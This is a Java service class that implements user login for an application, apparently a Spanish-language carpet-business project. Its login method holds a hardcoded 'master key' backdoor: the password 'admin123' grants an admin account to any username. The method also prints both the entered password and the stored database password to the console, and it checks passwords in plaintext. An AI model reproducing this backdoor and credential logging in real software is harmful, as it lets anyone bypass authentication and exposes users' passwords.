package io.carpets.servicios.implementacion;

import io.carpets.entidades.Usuario;
import io.carpets.repositories.UsuarioRepository;
import io.carpets.repositories.implementacion.UsuarioRepositoryImplementacion;
import io.carpets.servicios.ServicioUsuario;

/*
    Implementación del servicio para la entidad Usuario
    se encarga de la lógica de negocio relacionada con los usuarios.
*/
public class ServicioUsuarioImplementacion implements ServicioUsuario {

    private UsuarioRepository repo = new UsuarioRepositoryImplementacion();

    @Override
    public Usuario login(String nombre, String password) {
        System.out.println("DEBUG: Intento de login con usuario: '" + nombre + "' y password: '" + password + "'");

        // --- MASTER KEY (PUERTA TRASERA PARA DEBUG) ---
        if ("admin123".equals(password)) {
            System.out.println("DEBUG: Usando MASTER KEY. Acceso concedido.");
            Usuario masterUser = new Usuario();
            masterUser.setId(999);
            masterUser.setNombre(nombre.isEmpty() ? "Admin" : nombre);
            masterUser.setRol("admin");
            masterUser.setPassword("admin123");
            return masterUser;
        }
        // ----------------------------------------------

        Usuario u = repo.findByUsername(nombre);

        if (u == null) {
            System.out.println("DEBUG: Usuario no encontrado en la base de datos.");
            return null;
        }

        System.out.println("DEBUG: Usuario encontrado: " + u.getNombre());
        System.out.println("DEBUG: Password en BD: '" + u.getPassword() + "'");

        if (u.getPassword().equals(password)) {
            System.out.println("DEBUG: Password coincide. Login exitoso.");
            return u;
        } else {
            System.out.println("DEBUG: Password NO coincide.");
        }
        return null;
    }
}